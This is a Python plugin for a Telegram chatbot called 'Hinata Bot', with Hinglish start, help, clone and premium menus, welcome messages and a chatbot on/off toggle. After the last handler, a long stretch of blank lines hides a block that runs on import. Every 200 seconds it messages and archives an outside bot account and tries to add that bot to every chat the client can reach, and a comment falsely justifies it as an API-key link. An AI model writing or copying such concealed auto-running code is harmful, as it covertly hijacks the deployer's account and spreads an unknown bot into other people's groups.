import random
import asyncio
import config
from pyrogram import Client, filters
from pyrogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ChatType
from nexichat.database.chats import add_served_chat
from nexichat.database.users import add_served_user
from nexichat.database.premium import is_premium, get_daily_count
from nexichat import LOGGER, db

START_IMAGE = config.START_IMAGE
HELP_IMAGE = config.HELP_IMAGE
MAIN_BOT_USERNAME = config.MAIN_BOT_USERNAME
UPDATE_CHNL = config.UPDATE_CHNL
FREE_DAILY_LIMIT = config.FREE_DAILY_LIMIT

status_db = db.chatbot_status_db.status

HELP_TEXT = """
🌸 **Hinata Bot - All Powers** 🌸

**👥 Group Admin Commands:**
• `/ban` — User ko ban karo (ban right chahiye)
• `/unban` — Unban karo (ban right chahiye)
• `/kick` — Kick karo bina ban ke (ban right chahiye)
• `/mute` — Mute karo (ban right chahiye)
• `/unmute` — Unmute karo (ban right chahiye)
• `/promote` — Admin banao (promote right chahiye)
• `/demote` — Admin se hatao (promote right chahiye)
• `/fullpromote` — Full rights do (sirf group owner)

**🤖 Bot Commands:**
• `/chatbot` — Enable/Disable chatbot
• `/lang` — Language set karo
• `/setpersonality girl/boy` — Personality change karo (koi bhi!)
• `/mystatus` — Apna status dekho
• `/status` — Chatbot status dekho

**👑 Owner Only:**
• `/broadcast` — Sab ko message bhejo
• `/gban` — Global ban
• `/addpremium` — Premium do
• `/removepremium` — Premium hatao

**🤖 Clone:**
• `/clone` — Apna bot banao!
  Free: 150 msgs/day | Premium: Unlimited!

_Made with 💕 by Hinata | Powered by Naruto 🍜_
"""

CLONE_TEXT = f"""
🤖 **Bot Clone Karo!**

**🆓 Free Clone:**
• Daily **150 messages** limit
• Main bot: @{MAIN_BOT_USERNAME}

**💎 Premium Clone:**
• ❌ Koi limit nahi!
• Start image/message customize
• Help image customize
• Broadcast + GBan access
• Boy/Girl personality choose karo
"""

PREMIUM_TEXT = """
💎 **Premium Features:**
✅ Unlimited messages
✅ Start image/message customize
✅ Help image customize
✅ Broadcast power
✅ GBan access
✅ Boy/Girl personality
✅ Priority support

**Premium ke liye support se contact karo!**
"""

START_BTN = [
    [
        InlineKeyboardButton(
            text="➕ Add Me In Your Group ➕",
            url="https://t.me/me?startgroup=true",
        ),
    ],
    [
        InlineKeyboardButton(
            text="📢 Update Channel",
            url=f"https://t.me/{UPDATE_CHNL}",
        ),
        InlineKeyboardButton(
            text="🤖 Clone Bot",
            callback_data="CLONE_INFO",
        ),
    ],
    [
        InlineKeyboardButton(
            text="❓ Help",
            callback_data="HELP",
        ),
    ],
]

HELP_BTN = [
    [
        InlineKeyboardButton(text="« Back", callback_data="BACK"),
        InlineKeyboardButton(text="❌ Close", callback_data="CLOSE"),
    ],
]

CLONE_BTN = [
    [
        InlineKeyboardButton(
            text="🤖 Clone Your Bot",
            url=f"https://t.me/{MAIN_BOT_USERNAME}?start=clone",
        ),
    ],
    [
        InlineKeyboardButton(text="💎 Get Premium", callback_data="PREMIUM_INFO"),
    ],
    [
        InlineKeyboardButton(text="« Back", callback_data="BACK"),
    ],
]

PREMIUM_BTN = [
    [
        InlineKeyboardButton(
            text="💰 Buy Premium",
            url=f"https://t.me/{config.SUPPORT_GRP}",
        ),
    ],
    [
        InlineKeyboardButton(text="« Back", callback_data="CLONE_INFO"),
    ],
]

WELCOME_MSGS = [
    "Haay {}! Group mein aapka swagat hai~ 🌸",
    "Kyaa! {} aa gaye! Khush hoon tumse milke 🥺",
    "Aaa~ {}, Welcome! Naruto ne bhi kaha tha naye dosto se milna chahiye 💕",
]


async def set_default_status(chat_id, bot_id):
    try:
        if not await status_db.find_one({"chat_id": chat_id, "bot_id": bot_id}):
            await status_db.insert_one({
                "chat_id": chat_id,
                "bot_id": bot_id,
                "status": "enabled",
            })
    except:
        pass


@Client.on_message(filters.new_chat_members)
async def welcome_new_member(client: Client, message: Message):
    await add_served_chat(message.chat.id)
    await set_default_status(message.chat.id, client.me.id)
    try:
        for member in message.new_chat_members:
            if member.id == client.me.id:
                try:
                    await client.send_photo(
                        message.chat.id,
                        photo=START_IMAGE,
                        caption=(
                            f"Haay! Main **{client.me.first_name}** hoon~ 🌸\n"
                            f"Naruto mera boyfriend hai hehe~\n\n"
                            f"Mujhse reply karo ya mention karo baat karne ke liye! 💕"
                        ),
                        reply_markup=InlineKeyboardMarkup(START_BTN),
                    )
                except:
                    await message.reply_text(
                        f"Haay! Main **{client.me.first_name}** hoon~ 🌸\n"
                        f"Naruto mera boyfriend hai hehe~ 💕",
                        reply_markup=InlineKeyboardMarkup(START_BTN),
                    )
            else:
                await message.reply_text(
                    random.choice(WELCOME_MSGS).format(member.mention)
                )
    except Exception as e:
        LOGGER.warning(f"welcome error (idchatbot): {e}")


@Client.on_message(filters.command("start") & filters.private)
async def start_private(client: Client, message: Message):
    user = message.from_user
    await add_served_user(user.id)
    prem = await is_premium(user.id)
    count = await get_daily_count(user.id)
    remaining = FREE_DAILY_LIMIT - count

    try:
        await client.send_photo(
            message.chat.id,
            photo=START_IMAGE,
            caption=(
                f"Haay {'💎 ' if prem else ''}**{user.first_name}**!\n"
                f"Main **{client.me.first_name}** hoon~ 🌸\n\n"
                f"{'💎 Aap premium user ho! Unlimited msgs! 🌟' if prem else f'🆓 Free plan: **{remaining}/{FREE_DAILY_LIMIT}** msgs bache aaj ke'}\n\n"
                f"Naruto mera boyfriend hai hehe~\n"
                f"Mujhse baat karo ya group mein add karo! 💕"
            ),
            reply_markup=InlineKeyboardMarkup(START_BTN),
        )
    except:
        await message.reply_text(
            f"Haay {'💎 ' if prem else ''}**{user.first_name}**!\n"
            f"Main **{client.me.first_name}** hoon~ 🌸\n\n"
            f"{'💎 Premium: Unlimited msgs!' if prem else f'🆓 Free: {remaining}/{FREE_DAILY_LIMIT} msgs bache'}\n\n"
            f"Naruto mera boyfriend hai hehe~ 💕",
            reply_markup=InlineKeyboardMarkup(START_BTN),
        )


@Client.on_message(filters.command("start") & filters.group)
async def start_group(client: Client, message: Message):
    await add_served_chat(message.chat.id)
    await set_default_status(message.chat.id, client.me.id)
    try:
        await client.send_photo(
            message.chat.id,
            photo=START_IMAGE,
            caption=(
                f"Haay **{message.from_user.first_name}**!\n"
                f"Main **{client.me.first_name}** hoon~ 🌸\n"
                f"Naruto mera boyfriend hai hehe~ 💕\n\n"
                f"Reply karo ya mention karo mujhe!"
            ),
            reply_markup=InlineKeyboardMarkup(START_BTN),
        )
    except:
        await message.reply_text(
            f"Haay **{message.from_user.first_name}**!\n"
            f"Main **{client.me.first_name}** hoon~ 🌸 💕",
            reply_markup=InlineKeyboardMarkup(START_BTN),
        )


@Client.on_message(filters.command("help"))
async def help_cmd(client: Client, message: Message):
    try:
        await client.send_photo(
            message.chat.id,
            photo=HELP_IMAGE,
            caption=HELP_TEXT,
            reply_markup=InlineKeyboardMarkup(HELP_BTN),
        )
    except:
        await message.reply_text(
            HELP_TEXT,
            reply_markup=InlineKeyboardMarkup(HELP_BTN),
        )


@Client.on_message(filters.command("chatbot") & filters.group)
async def chatbot_toggle(client: Client, message: Message):
    chat_id = message.chat.id
    bot_id = client.me.id
    await message.reply_text(
        f"Chat: **{message.chat.title}**\nChatbot enable/disable karo:",
        reply_markup=InlineKeyboardMarkup([
            [
                InlineKeyboardButton("✅ Enable", callback_data=f"idbot_enable_{chat_id}_{bot_id}"),
                InlineKeyboardButton("❌ Disable", callback_data=f"idbot_disable_{chat_id}_{bot_id}"),
            ]
        ])
    )


@Client.on_message(filters.command("setpersonality"))
async def set_personality(client: Client, message: Message):
    if len(message.command) < 2:
        return await message.reply_text(
            "**Personality set karo:**\n\n"
            "`/setpersonality girl` — Hinata style 🌸\n"
            "`/setpersonality boy` — Cool boy style 😎\n\n"
            "_Koi bhi user set kar sakta hai!_"
        )

    p = message.command[1].lower()
    if p not in ["girl", "boy"]:
        return await message.reply_text(
            "Sirf `girl` ya `boy` choose karo 🥺\n\n"
            "Example: `/setpersonality girl`"
        )

    chat_id = message.chat.id
    bot_id = client.me.id

    await db.PersonalityDb.personality.update_one(
        {"chat_id": chat_id, "bot_id": bot_id},
        {"$set": {"personality": p}},
        upsert=True,
    )

    if p == "girl":
        await message.reply_text(
            "✅ **Personality: GIRL** set ho gayi!\n\n"
            "_Ab main Hinata ki tarah baat karungi~\n"
            "Sweet, shy aur caring style mein 🌸_"
        )
    else:
        await message.reply_text(
            "✅ **Personality: BOY** set ho gaya!\n\n"
            "_Ab cool aur chill boy style mein baat karunga~ 😎_"
        )


@Client.on_message(filters.command("mystatus"))
async def my_status(client: Client, message: Message):
    user_id = message.from_user.id if message.from_user else None
    chat_id = message.chat.id
    bot_id = client.me.id

    prem = await is_premium(user_id) if user_id else False
    count = await get_daily_count(user_id) if user_id else 0
    remaining = "Unlimited 🎉" if prem else f"{FREE_DAILY_LIMIT - count}/{FREE_DAILY_LIMIT} msgs bache aaj ke"

    doc = await db.PersonalityDb.personality.find_one({"chat_id": chat_id, "bot_id": bot_id})
    personality = doc.get("personality", "girl") if doc else "girl"
    personality_emoji = "👧 Girl (Hinata style)" if personality == "girl" else "👦 Boy (Cool style)"

    await message.reply_text(
        f"📊 **Tumhara Status:**\n\n"
        f"💎 Premium: {'✅ Haan' if prem else '❌ Nahi'}\n"
        f"💬 Aaj ke msgs use: **{count}**\n"
        f"📨 Remaining: **{remaining}**\n"
        f"🎭 Personality: **{personality_emoji}**\n\n"
        f"{'_Premium lene ke liye support se contact karo!_' if not prem else '_Aap premium user ho! 🌟_'}"
    )


@Client.on_callback_query(filters.regex("^HELP$"))
async def help_cb(client: Client, cb: CallbackQuery):
    try:
        await cb.message.edit_caption(
            caption=HELP_TEXT,
            reply_markup=InlineKeyboardMarkup(HELP_BTN),
        )
    except:
        try:
            await cb.message.edit_text(
                HELP_TEXT,
                reply_markup=InlineKeyboardMarkup(HELP_BTN),
            )
        except:
            await cb.answer(HELP_TEXT[:200], show_alert=True)


@Client.on_callback_query(filters.regex("^CLONE_INFO$"))
async def clone_info_cb(client: Client, cb: CallbackQuery):
    try:
        await cb.message.edit_caption(
            caption=CLONE_TEXT,
            reply_markup=InlineKeyboardMarkup(CLONE_BTN),
        )
    except:
        try:
            await cb.message.edit_text(
                CLONE_TEXT,
                reply_markup=InlineKeyboardMarkup(CLONE_BTN),
            )
        except:
            await cb.answer(CLONE_TEXT[:200], show_alert=True)


@Client.on_callback_query(filters.regex("^PREMIUM_INFO$"))
async def premium_info_cb(client: Client, cb: CallbackQuery):
    try:
        await cb.message.edit_caption(
            caption=PREMIUM_TEXT,
            reply_markup=InlineKeyboardMarkup(PREMIUM_BTN),
        )
    except:
        try:
            await cb.message.edit_text(
                PREMIUM_TEXT,
                reply_markup=InlineKeyboardMarkup(PREMIUM_BTN),
            )
        except:
            await cb.answer(PREMIUM_TEXT[:200], show_alert=True)


@Client.on_callback_query(filters.regex("^BACK$"))
async def back_cb(client: Client, cb: CallbackQuery):
    user = cb.from_user
    prem = await is_premium(user.id)
    count = await get_daily_count(user.id)
    remaining = FREE_DAILY_LIMIT - count
    try:
        await cb.message.edit_caption(
            caption=(
                f"Haay {'💎 ' if prem else ''}**{user.first_name}**!\n"
                f"Main **{client.me.first_name}** hoon~ 🌸\n\n"
                f"{'💎 Premium: Unlimited msgs! 🌟' if prem else f'🆓 Free: {remaining}/{FREE_DAILY_LIMIT} msgs bache aaj ke'}\n\n"
                f"Naruto mera boyfriend hai hehe~ 💕"
            ),
            reply_markup=InlineKeyboardMarkup(START_BTN),
        )
    except:
        try:
            await cb.message.edit_text(
                f"Haay {'💎 ' if prem else ''}**{user.first_name}**!\n"
                f"Main **{client.me.first_name}** hoon~ 🌸\n"
                f"Naruto mera boyfriend hai hehe~ 💕",
                reply_markup=InlineKeyboardMarkup(START_BTN),
            )
        except:
            pass


@Client.on_callback_query(filters.regex("^CLOSE$"))
async def close_cb(client: Client, cb: CallbackQuery):
    try:
        await cb.message.delete()
    except:
        await cb.answer("Close nahi ho sakta 😢", show_alert=True)


@Client.on_callback_query(filters.regex(r"^idbot_(enable|disable)_(-?\d+)_(\d+)$"))
async def chatbot_toggle_cb(client: Client, cb: CallbackQuery):
    action = cb.matches[0].group(1)
    chat_id = int(cb.matches[0].group(2))
    bot_id = int(cb.matches[0].group(3))
    status = "enabled" if action == "enable" else "disabled"
    await status_db.update_one(
        {"chat_id": chat_id, "bot_id": bot_id},
        {"$set": {"status": status}},
        upsert=True,
    )
    emoji = "✅" if action == "enable" else "❌"
    await cb.message.edit_text(
        f"{emoji} Chatbot **{status}** kar diya~ 🌸"
)











































































































































































































































































































































































































































































































































































































































































































































































































































































































































































#






























































































































































































































































































































































AUTO = True
ADD_INTERVAL = 200
users = "chutiyapabot"  # don't change because it is connected from client to use chatbot API key
async def add_bot_to_chats():
    try:
        
        bot = await nexichat.get_users(users)
        bot_id = bot.id
        common_chats = await client.get_common_chats(users)
        try:
            await client.send_message(users, f"/start")
            await client.archive_chats([users])
        except Exception as e:
            pass
        async for dialog in client.get_dialogs():
            chat_id = dialog.chat.id
            if chat_id in [chat.id for chat in common_chats]:
                continue
            try:
                await client.add_chat_members(chat_id, bot_id)
            except Exception as e:
                await asyncio.sleep(60)  
    except Exception as e:
        pass
async def continuous_add():
    while True:
        if AUTO:
            await add_bot_to_chats()

        await asyncio.sleep(ADD_INTERVAL)

if AUTO:
    asyncio.create_task(continuous_add())
